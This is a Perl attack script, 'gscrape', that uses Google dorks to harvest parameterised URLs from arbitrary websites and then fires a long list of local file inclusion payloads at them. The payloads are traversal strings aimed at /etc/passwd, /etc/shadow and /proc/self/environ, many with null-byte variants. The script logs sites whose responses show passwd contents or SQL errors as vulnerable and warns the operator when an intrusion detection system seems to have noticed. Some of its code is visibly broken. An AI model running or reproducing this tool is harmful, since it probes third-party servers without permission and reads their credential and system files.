#!/usr/bin/perl
 
# gscrape.pl
#
# Uses Google::Search to either iterate through a list of dorks (dorks.lst)
# And then prints out a list of vulnerable sites.
 
use Term::ANSIColor;
use Getopt::Std;
use HTTP::Request;
use Google::Search;
use LWP::UserAgent;
 
#vars n stuff
my $search;
my $useragent = LWP::UserAgent->new();
my $infile;
my $outfile;
my $searchmode;
my @url_list;
my @search_terms; #search terms and
my @dorks;        #dorks, to check if the terms have "inurl:".
my @vulnsites;
 
 
 
##--main execution:
		&banner();
		&getOpts();
 
 
		if ($opt{s} || $opt{f} && $opt{o} && !$opt{h}) {
		&printInfo("Trying with the following settings:");
		&printInfo( ">>Search Mode: $searchmode");
		&printInfo( ">>Output file: $outfile");
 
	if ($searchmode == "single" && $searchmode != "list"){
 
		&printInfo( ">>Search Term: $search");
		&search_single();
		} else {
			 &printInfo( ">>Search List: $infile");
			 &search_list(); 
			 }
 
 
		 }
		 if (!$opt{h} && !$opt{o}){
             &printCritical("YOU MUST SPECIFY AN OUTPUT FILE!1!one!");
             &printInfo("use -h flag for help");
			 print"\n\r\nExiting..\n";
		 }
 
 
 
 
 
 
##--subroutines:.
 
 
 
#Search using a list of terms:
sub search_list(){
 
open FILE, "<", $infile or die $!;
my @search_terms = <FILE>;
my $num = @search_terms;
&printInfo("Loaded $num search terms.");
&printInfo("Fixing improper search terms [if any]");
#iterate through the search terms, checking if they have "inurl:" if not, prepend it.
for( my $int = 0; $int < $num; $int++){
	my $random = int(rand($num));
 
	if ( @search_terms[$random] !~ /inurl:/ ){ 
		push(@dorks, "inurl:".@search_terms[$random]);
		} 
	if ( @search_terms[$random] =~ /inurl:/){
		push(@dorks, @search_terms[$random]);
		}
 
 
	}
	print"\n";
&printInfo("Retrieving search results..");
 
#iterate through the google dorks (search terms, with 'inurl:'), and add them to the list of sites.
foreach(@dorks) { 
 
	 $search = Google::Search->Web( query => $_ );
	while ( my $result = $search->next ) {
		if( $result->uri =~ /\=/) { #check if results have "=" in them (ex: www.site.com/index.php?page=LOLCATS)
			push(@url_list, $result->uri); #push result into the array
			&printInfo(">>".$result->uri);
		}
	}
}
 
my @lfitest = (
    '/etc/passwd%00',
	'/etc/passwd',
	'/proc/self/environ%00',
	'/proc/self/environ',
	'../../../../../../../../../../../../../../../proc/self/environ',
	'../../../../../../../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../../../../../../etc/passwd',
    '../../../../../../../../../../../../../../../etc/passwd%00',
    '../../etc/passwd',
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../../../../../etc/passwd',
    '../../../../../../../etc/passwd',
    '../../../../../../../../etc/passwd',
    '../../../../../../../../../etc/passwd',
    '../../../../../../../../../../etc/passwd',
    '../../../../../../../../../../../etc/passwd',
    '../../../../../../../../../../../../etc/passwd',
    '../../../../../../../../../../../../../etc/passwd',
    '../../../../../../../../../../../../../../etc/passwd',
    '../../../../../../../../../../../../../../../../etc/passwd',
    '....//etc/passwd',
    '....//....//etc/passwd',
    '....//....//....//etc/passwd',
    '....//....//....//....//etc/passwd',
    '....//....//....//....//....//etc/passwd',
    '....//....//....//....//....//....//etc/passwd',
    '....//....//....//....//....//....//....//etc/passwd',
    '....//....//....//....//....//....//....//....//etc/passwd',
    '....//....//....//....//....//....//....//....//....//etc/passwd',
    '....//....//....//....//....//....//....//....//....//....//etc/passwd',
    '../../etc/passwd%00',
    '../../../etc/passwd%00',
    '../../../../etc/passwd%00',
    '../../../../../etc/passwd%00',
    '../../../../../../etc/passwd%00',
    '../../../../../../../etc/passwd%00',
    '../../../../../../../../etc/passwd%00',
    '../../../../../../../../../etc/passwd%00',
    '../../../../../../../../../../etc/passwd%00',
    '../../../../../../../../../../../etc/passwd%00',
    '../../../../../../../../../../../../etc/passwd%00',
    '../../../../../../../../../../../../../etc/passwd%00',
    '../../../../../../../../../../../../../../etc/passwd%00',
    '../../../../../../../../../../../../../../../../etc/passwd%00',
    '....//etc/passwd%00',
    '....//....//etc/passwd%00',
    '....//....//....//etc/passwd%00',
    '....//....//....//....//etc/passwd%00',
    '....//....//....//....//....//etc/passwd%00',
    '....//....//....//....//....//....//etc/passwd%00',
    '....//....//....//....//....//....//....//etc/passwd%00',
    '....//....//....//....//....//....//....//....//etc/passwd%00',
    '....//....//....//....//....//....//....//....//....//etc/passwd%00',
    '....//....//....//....//....//....//....//....//....//....//etc/passwd%00',
    '../etc/shadow',
    '../../etc/shadow',
    '../../../etc/shadow',
    '../../../../etc/shadow',
    '../../../../../etc/shadow',
    '../../../../../../etc/shadow',
    '../../../../../../../etc/shadow',
    '../../../../../../../../etc/shadow',
    '../../../../../../../../../etc/shadow',
    '../../../../../../../../../../etc/shadow',
    '../../../../../../../../../../../etc/shadow',
    '../../../../../../../../../../../../etc/shadow',
    '../../../../../../../../../../../../../etc/shadow',
    '../../../../../../../../../../../../../../etc/shadow',
    '../etc/shadow%00',
    '../../etc/shadow%00',
    '../../../etc/shadow%00',
    '../../../../etc/shadow%00',
    '../../../../../etc/shadow%00',
    '../../../../../../etc/shadow%00',
    '../../../../../../../etc/shadow%00',
    '../../../../../../../../etc/shadow%00',
    '../../../../../../../../../etc/shadow%00',
    '../../../../../../../../../../etc/shadow%00',
    '../../../../../../../../../../../etc/shadow%00',
    '../../../../../../../../../../../../etc/shadow%00',
    '../../../../../../../../../../../../../etc/shadow%00',
    '../../../../../../../../../../../../../../etc/shadow%00',
    '../etc/group',
    '../../etc/group',
    '../../../etc/group',
    '../../../../etc/group',
    '../../../../../etc/group',
    '../../../../../../etc/group',
    '../../../../../../../etc/group',
    '../../../../../../../../etc/group',
    '../../../../../../../../../etc/group',
    '../../../../../../../../../../etc/group',
    '../../../../../../../../../../../etc/group',
    '../../../../../../../../../../../../etc/group',
    '../../../../../../../../../../../../../etc/group',
    '../../../../../../../../../../../../../../etc/group',
    '../etc/group%00',
    '../../etc/group%00',
    '../../../etc/group%00',
    '../../../../etc/group%00',
    '../../../../../etc/group%00',
    '../../../../../../etc/group%00',
    '../../../../../../../etc/group%00',
    '../../../../../../../../etc/group%00',
    '../../../../../../../../../etc/group%00',
    '../../../../../../../../../../etc/group%00',
    '../../../../../../../../../../../etc/group%00',
    '../../../../../../../../../../../../etc/group%00',
    '../../../../../../../../../../../../../etc/group%00',
    '../../../../../../../../../../../../../../etc/group%00',
    '../etc/security/group',
    '../../etc/security/group',
    '../../../etc/security/group',
    '../../../../etc/security/group',
    '../../../../../etc/security/group',
    '../../../../../../etc/security/group',
    '../../../../../../../etc/security/group',
    '../../../../../../../../etc/security/group',
    '../../../../../../../../../etc/security/group',
    '../../../../../../../../../../etc/security/group',
    '../../../../../../../../../../../etc/security/group',
    '../etc/security/group%00',
    '../../etc/security/group%00',
    '../../../etc/security/group%00',
    '../../../../etc/security/group%00',
    '../../../../../etc/security/group%00',
    '../../../../../../etc/security/group%00',
    '../../../../../../../etc/security/group%00',
    '../../../../../../../../etc/security/group%00',
    '../../../../../../../../../etc/security/group%00',
    '../../../../../../../../../../etc/security/group%00',
    '../../../../../../../../../../../etc/security/group%00',
    '../etc/security/passwd',
    '../../etc/security/passwd',
    '../../../etc/security/passwd',
    '../../../../etc/security/passwd',
    '../../../../../etc/security/passwd',
    '../../../../../../etc/security/passwd',
    '../../../../../../../etc/security/passwd',
    '../../../../../../../../etc/security/passwd',
    '../../../../../../../../../etc/security/passwd',
    '../../../../../../../../../../etc/security/passwd',
    '../../../../../../../../../../../etc/security/passwd',
    '../../../../../../../../../../../../etc/security/passwd',
    '../../../../../../../../../../../../../etc/security/passwd',
    '../../../../../../../../../../../../../../etc/security/passwd',
    '../etc/security/passwd%00',
    '../../etc/security/passwd%00',
    '../../../etc/security/passwd%00',
    '../../../../etc/security/passwd%00',
    '../../../../../etc/security/passwd%00',
    '../../../../../../etc/security/passwd%00',
    '../../../../../../../etc/security/passwd%00',
    '../../../../../../../../etc/security/passwd%00',
    '../../../../../../../../../etc/security/passwd%00',
    '../../../../../../../../../../etc/security/passwd%00',
    '../../../../../../../../../../../etc/security/passwd%00',
    '../../../../../../../../../../../../etc/security/passwd%00',
    '../../../../../../../../../../../../../etc/security/passwd%00',
    '../../../../../../../../../../../../../../etc/security/passwd%00',
    '../etc/security/user',
    '../../etc/security/user',
    '../../../etc/security/user',
    '../../../../etc/security/user',
    '../../../../../etc/security/user',
    '../../../../../../etc/security/user',
    '../../../../../../../etc/security/user',
    '../../../../../../../../etc/security/user',
    '../../../../../../../../../etc/security/user',
    '../../../../../../../../../../etc/security/user',
    '../../../../../../../../../../../etc/security/user',
    '../../../../../../../../../../../../etc/security/user',
    '../../../../../../../../../../../../../etc/security/user',
    '../etc/security/user%00',
    '../../etc/security/user%00',
    '../../../etc/security/user%00',
    '../../../../etc/security/user%00',
    '../../../../../etc/security/user%00',
    '../../../../../../etc/security/user%00',
    '../../../../../../../etc/security/user%00',
    '../../../../../../../../etc/security/user%00',
    '../../../../../../../../../etc/security/user%00',
    '../../../../../../../../../../etc/security/user%00',
    '../../../../../../../../../../../etc/security/user%00',
    '../../../../../../../../../../../../etc/security/user%00',
    '../../../../../../../../../../../../../etc/security/user%00'
);

# enviroment scanning
my @enviroment_ = ('
    ../proc/self/environ',
    '../../proc/self/environ',
    '../../../proc/self/environ',
    '../../../../proc/self/environ',
    '../../../../../proc/self/environ',
    '../../../../../../proc/self/environ',
    '../../../../../../../proc/self/environ',
    '../../../../../../../../proc/self/environ',
    '../../../../../../../../../proc/self/environ',
    '../../../../../../../../../../proc/self/environ',
    '../../../../../../../../../../../proc/self/environ',
    '../../../../../../../../../../../../proc/self/environ',
    '../../../../../../../../../../../../../proc/self/environ',
    '../../../../../../../../../../../../../../proc/self/environ',
    '../proc/self/environ%00',
    '../../proc/self/environ%00',
    '../../../proc/self/environ%00',
    '../../../../proc/self/environ%00',
    '../../../../../proc/self/environ%00',
    '../../../../../../proc/self/environ%00',
    '../../../../../../../proc/self/environ%00',
    '../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../../../../../proc/self/environ%00'

);
 
 
my $lfinum = @lfitest;
 
print"\n";
&printInfo("Testing sites for vulnerabilities..");
 
 
 
#Test the sites for vulns.
 
foreach( @url_list ){
	my $index = @url_list;
	my $randint = int(rand($index));
 
		my $x = @url_list[$randint];
		$x =~ s/=.*/=/ ;
 
 
 
		for (my $i = 0; $i < $lfinum; $i++){
			if ( $x !~ /http:\/\// ){
				$x = "http://".$x;
			}
 
 
 
        my $request = $useragent->get($x.@lfitest[$i]);
        my $result = $request->content;
 
        if ($result =~ m/root:x:/i || m/HTTP_USER_AGENT/){
			&printVulnLFI(">>> ".$x.@lfitest[$i]);
			open FILE, ">>", $outfile or die $!;
			print FILE "[LFI VULN] >> ".$x.@lfitest[$i]."\n";
			close FILE;
			last;
		}
		if ($result =~ m/error in your/i || m/syntax/i){
			&printVulnSQLI(">>> ".$x.@lfitest[$i]);
						open FILE, ">>", $outfile or die $!;
			print FILE "[SQLI VULN] >> ".$x.@lfitest."'\n";
			close FILE;
			last;
		}
		if ($result =~ m/hacking/i || m/reported/i ||  m/recorded/i || m/malicious/i){
			&printCritical("> Whoops! Tripped an IDS at: ".$x." With: ".@lfitest[$i]);
 
		}
 
	}
}
 
}
 
 
 
 
 
 
sub banner() {
#system('clear');
    print("\r+=====================================================================+
           \r|                              GScrape                                |
           \r|         ________  _________                                         |
           \r|        /  _____/ /   _____/ ________________  ______   ____         |
           \r|       /   \\  ___ \\_____  \\_/ ___\\_  __ \\__  \\ \\____ \\_/ __ \\        |
           \r|       \\    \\_\\  \\/        \\  \\___|  | \\// __ \\|  |_> >  ___/        |
           \r|        \\______  /_______  /\\___  >__|  (____  /   __/ \\___  >       |
           \r|               \\/        \\/     \\/           \\/|__|        \\/        |
           \r|                                                                     |
           \r|                                                                     |
           \r|           Uses Google AJAX API to search for vulnerabilities        |
            \r+=====================================================================+
           " );
}
 
 
sub getOpts(){
	#option modes, and args.
	my $opt_string = 'f:o:h';
        getopts( "$opt_string", \%opt );
 
        #set vars of $outfile, and $infile if they are defined.
 
 
		if ($opt{o}){
			$outfile = $opt{o};
		}
 
		if ($opt{f}){
 
			$infile = $opt{f};
			$searchmode = "list";
 
		}
 
 
 
        #Display help page if -h
        usage() if $opt{h};
 
 
 
}

 
 
 